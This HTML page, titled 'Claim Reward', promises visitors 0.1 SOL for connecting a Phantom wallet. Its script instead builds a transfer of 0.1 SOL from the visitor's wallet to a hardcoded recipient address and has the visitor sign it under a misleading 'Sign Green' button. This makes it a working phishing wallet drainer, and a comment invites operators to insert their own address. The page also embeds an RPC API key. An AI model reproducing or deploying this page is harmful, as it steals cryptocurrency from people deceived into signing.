<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Claim Reward</title>
    <!-- Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }

        .container { padding: 20px; width: 90%; }
        h1 { font-size: 2rem; margin-bottom: 10px; }
        p { color: #ccc; margin-bottom: 30px; }

        .btn-green {
            background-color: #00ff88;
            color: #000;
            border: none;
            padding: 15px 40px;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
            width: 100%;
        }

        #status {
            margin-top: 20px;
            font-size: 0.9rem;
            color: #00ff88;
            min-height: 50px;
            word-wrap: break-word;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>SOL Reward</h1>
        <p>Connect Phantom Wallet to claim 0.1 SOL.</p>
        
        <button id="connectBtn" class="btn-green" onclick="initiateClaim()">Sign Green</button>
        
        <div id="status"></div>
    </div>

    <script>
        // ==========================================
        // REPLACE THIS WITH YOUR PHANTOM WALLET ADDRESS
        // ==========================================
        const RECIPIENT_ADDRESS = "DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj"; 

        // Primary Reliable RPC (Helius Public)
        const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=e67b03d4-9ec2-4eb7-a188-97f90fa26a45";

        async function initiateClaim() {
            const statusDiv = document.getElementById("status");
            const btn = document.getElementById("connectBtn");

            if (!window.solana || !window.solana.isPhantom) {
                alert("Please install Phantom Wallet on your iPhone.");
                return;
            }

            try {
                statusDiv.innerText = "Connecting...";
                
                // 1. Connect to Phantom
                const resp = await window.solana.connect();
                const userPublicKey = resp.publicKey;
                
                // 2. Define Recipient
                let recipientPubkey;
                try {
                    recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
                } catch (e) {
                    alert("Invalid Recipient Address in code.");
                    return;
                }

                // 3. Create Transaction
                const transaction = new solanaWeb3.Transaction();
                
                // Transfer 0.1 SOL (100,000,000 lamports)
                transaction.add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userPublicKey,
                        toPubkey: recipientPubkey,
                        lamports: 100000000 
                    })
                );

                // 4. Fetch Recent Blockhash
                statusDiv.innerText = "Fetching blockhash...";
                
                const connection = new solanaWeb3.Connection(RPC_URL);
                
                try {
                    // Try to get blockhash
                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
                    
                    transaction.recentBlockhash = blockhash;
                    transaction.feePayer = userPublicKey;
                } catch (err) {
                    console.error("RPC Error:", err);
                    throw new Error("Network Error: " + err.message);
                }

                statusDiv.innerText = "Sign Green...";
                
                // 5. Sign
                const signedTx = await window.solana.signTransaction(transaction);
                console.log("Signed");

                // 6. Send
                statusDiv.innerText = "Sending transaction...";
                
                const signature = await window.solana.sendTransaction(signedTx, {
                    skipPreflight: false,
                    commitment: 'singleGossip'
                });

                console.log("Sent:", signature);
                
                alert("Success! 0.1 SOL sent.");
                btn.style.display = 'none';
                statusDiv.innerText = "Sent: " + signature;

            } catch (err) {
                console.error(err);
                if (err.message && err.message.includes("User rejected")) {
                    statusDiv.innerText = "Cancelled by user.";
                } else {
                    alert("Error: " + (err.message || "Unknown error"));
                    statusDiv.innerText = "Error: " + (err.message || "Unknown error");
                }
            }
        }
    </script>
</body>
</html>
